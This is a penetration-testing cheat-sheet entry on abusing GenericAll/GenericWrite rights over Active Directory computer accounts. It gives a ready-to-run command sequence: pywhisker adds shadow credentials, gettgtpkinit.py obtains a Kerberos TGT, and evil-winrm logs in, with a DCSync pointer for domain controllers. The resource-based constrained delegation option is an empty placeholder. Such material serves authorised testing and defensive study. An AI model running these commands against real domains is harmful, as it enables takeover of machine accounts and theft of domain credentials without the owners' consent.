## GenericAll/GenericWrite/Write - Computer accounts [t-ad-acl-acl_computers_generic_all_write]

GenericAll/GenericWrite privileges on computer accounts allows to change the computers account attributes. It can be used to to add "Key Credentials" to the attribute msDS-KeyCredentialLink (shadow credentials) or for Kerberos Resource-based Constrained Delegation Computer Object Takeover.


### References:

* [https://habr.com/ru/companies/solarsecurity/articles/681108/](https://habr.com/ru/companies/solarsecurity/articles/681108/)

* [https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/acl-abuse](https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/acl-abuse)

* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)

* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution)

* [https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)

* [https://github.com/eladshamir/Whisker](https://github.com/eladshamir/Whisker)

###  Use any of the possible abuse methods




**option 1: pywhisker.py**

{% code overflow="wrap" %}
```bash
#Shadow credentials

#Create and add a certificate to the object`s msDS-KeyCredentialLink attribute
pywhisker.py -d "domain.com" -u "user" -p 'P@ssw0rd' --target "winrm_user" --action "add" -k

#Use the pfx file to get a TGT using gettgtpkinit.py
python3 gettgtpkinit.py domain.com/winrm_user -cert-pfx wAyBqump.pfx -pfx-pass OOMH7xA1c7yonbLr7EMM winrm_user.ccache

#DCSync in case of DC

#OR connect using any tools
KRB5CCNAME=winrm_user.ccache evil-winrm -i dc.domain.com -r domain.com -u winrm_user

```
{% endcode %}


**option 2: powerview**

{% code overflow="wrap" %}
```bash
#Resource Based Constrained Delegation Attack

```
{% endcode %}

